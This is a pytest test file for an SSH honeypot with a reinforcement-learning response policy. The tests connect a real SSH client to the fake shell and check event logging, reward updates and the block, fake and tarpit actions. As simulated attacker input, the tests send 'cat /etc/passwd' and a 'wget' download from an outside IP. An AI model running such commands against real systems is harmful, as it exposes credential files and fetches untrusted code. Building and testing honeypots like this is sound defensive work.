"""End-to-end: start the honeypot on an ephemeral port and talk to it with a real SSH client."""
import asyncio

import asyncssh
import pytest

from honeypot.config import RLParams, Settings
from honeypot.emitter import MemoryEmitter
from honeypot.rl.policies import ACTION_COST, Action, QLearningPolicy, StaticPolicy
from honeypot.server import start_server


class FixedPolicy(StaticPolicy):
    """Always returns one chosen action (for exercising DELAY/FAKE/TARPIT/BLOCK)."""
    def __init__(self, action: Action):
        super().__init__()
        self.action = action

    def choose(self, state):
        return self.action


@pytest.fixture
async def honeypot(tmp_path):
    settings = Settings(host_key_path=str(tmp_path / "hostkey"), qtable_path=str(tmp_path / "q.json"),
                        login_attempts_min=1, login_attempts_max=1, idle_timeout_seconds=10)
    emitter = MemoryEmitter()
    servers = []

    async def start(policy=None, **overrides):
        s = settings.with_overrides(**overrides) if overrides else settings
        acceptor, ctx = await start_server(s, policy=policy or QLearningPolicy(RLParams()), emitter=emitter,
                                           host="127.0.0.1", port=0, time_scale=0.02)
        servers.append(acceptor)
        return acceptor.get_port(), ctx

    yield start, emitter
    for a in servers:
        a.close()
        await a.wait_closed()


async def connect(port, username="root", password="toor"):
    return await asyncssh.connect("127.0.0.1", port, username=username, password=password,
                                  known_hosts=None, client_keys=None)


async def read_until(stream, marker, timeout=5.0):
    buf = ""
    async with asyncio.timeout(timeout):
        while marker not in buf:
            chunk = await stream.read(1024)
            if not chunk:
                break
            buf += chunk
    return buf


async def test_exec_command_roundtrip(honeypot):
    start, emitter = honeypot
    port, _ = await start()
    async with await connect(port) as conn:
        result = await conn.run("uname -a")
    assert "Linux ubuntu-srv01 5.15.0-91-generic" in result.stdout
    types = [e["type"] for e in emitter.events]
    assert types[:3] == ["connection", "login_attempt", "session_start"]
    assert "command" in types and types[-1] == "session_end"
    cmd = emitter.of_type("command")[0]
    assert cmd["command"] == "uname -a" and cmd["category"] == "recon" and cmd["state"] == "recon|early"
    assert emitter.of_type("session_end")[0]["reason"] == "exec_done"


async def test_interactive_session_learns(honeypot):
    start, emitter = honeypot
    port, ctx = await start()
    async with await connect(port) as conn:
        proc = await conn.create_process(term_type="xterm")
        banner = await read_until(proc.stdout, "root@ubuntu-srv01:~# ")
        assert "Welcome to Ubuntu" in banner
        proc.stdin.write("cat /etc/passwd\n")
        out = await read_until(proc.stdout, "root@ubuntu-srv01:~# ")
        assert "root:x:0:0" in out
        proc.stdin.write("wget http://198.51.100.9/x\n")
        await read_until(proc.stdout, "root@ubuntu-srv01:~# ")
        proc.stdin.write("exit\n")
        await asyncio.wait_for(proc.wait_closed(), 5)
    cmds = emitter.of_type("command")
    assert [c["category"] for c in cmds] == ["cred_access", "download", "benign"]
    updates = emitter.of_type("rl_update")
    assert len(updates) == 3                       # two "continued" updates + one terminal
    assert updates[0]["continued"] is True and updates[-1]["continued"] is False
    # r = w_e + w_v * v(download) - w_c * chi(action taken on command 1)
    expected = 1.0 + 0.5 * 4 - 0.02 * ACTION_COST[Action(updates[0]["action"])]
    assert updates[0]["reward"] == pytest.approx(expected, abs=1e-3)
    end = emitter.of_type("session_end")[0]
    assert end["commands"] == 3 and end["reason"] == "exit" and ctx.policy.episodes == 1
    assert (ctx.settings.qtable_path and __import__("os").path.exists(ctx.settings.qtable_path))


async def test_block_action_closes_connection(honeypot):
    start, emitter = honeypot
    port, _ = await start(policy=FixedPolicy(Action.BLOCK))
    async with await connect(port) as conn:
        proc = await conn.create_process(term_type="xterm")
        await read_until(proc.stdout, "# ")
        proc.stdin.write("id\n")
        await asyncio.wait_for(proc.wait_closed(), 5)
    assert emitter.of_type("session_end")[0]["reason"] == "blocked"


async def test_fake_and_tarpit_still_answer(honeypot):
    start, emitter = honeypot
    for action in (Action.FAKE, Action.TARPIT, Action.DELAY):
        port, _ = await start(policy=FixedPolicy(action))
        async with await connect(port) as conn:
            result = await asyncio.wait_for(conn.run("ls -la /root"), 10)
        assert ".bash_history" in result.stdout
        if action is Action.FAKE:
            assert "backup_credentials.txt" in result.stdout


async def test_login_threshold(honeypot):
    start, emitter = honeypot
    port, _ = await start(login_attempts_min=2, login_attempts_max=2)
    with pytest.raises(asyncssh.PermissionDenied):
        await connect(port, password="first-try")
    async with await connect(port, password="second-try") as conn:
        assert (await conn.run("whoami")).stdout.strip() == "root"
    attempts = emitter.of_type("login_attempt")
    assert [a["success"] for a in attempts] == [False, True]
    assert attempts[1]["password"] == "second-try"
